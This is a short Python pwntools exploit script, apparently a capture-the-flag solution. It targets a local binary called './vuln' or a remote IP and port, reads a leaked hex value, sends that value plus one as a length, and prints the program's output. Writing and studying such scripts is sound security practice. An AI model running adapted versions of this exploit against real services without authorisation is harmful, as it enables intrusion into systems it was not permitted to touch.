from pwn import *
import argparse

def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="Exploit script for local or remote target")
    parser.add_argument("--ip", help="Remote IP address of the target")
    parser.add_argument("--port", type=int, help="Remote port of the target")
    parser.add_argument("--local", action="store_true", help="Run the binary locally")
    parser.add_argument("--path", default="./vuln", help="Path to the local binary (default: ./vuln)")
    return parser.parse_args()

def start_process(args):
    """Start local process or connect to remote."""
    if args.local:
        context.binary = args.path
        log.info("Running exploit locally")
        return process(args.path)
    else:
        if not args.ip or not args.port:
            log.error("Remote mode requires --ip and --port.")
            exit(1)
        log.info(f"Connecting remotely to {args.ip}:{args.port}")
        return remote(args.ip, args.port)

def leak_value(p):
    """Receive the leaked value from the program output."""
    p.recvuntil(b"accept this: ")
    leak_hex = p.recv(14)
    leak_int = int(leak_hex, 16)
    log.success(f"Leaked value: {hex(leak_int)}")
    return leak_int

def exploit(p, leak):
    """Send final payload based on the leaked value."""
    length = leak + 1
    p.sendlineafter(b"length:", str(length).encode())
    p.sendafter(b"song:", b"0")
    output = p.recvall()
    print(output.decode(errors='ignore'))

def main():
    args = parse_args()
    p = start_process(args)
    leak = leak_value(p)
    exploit(p, leak)

if __name__ == "__main__":
    main()
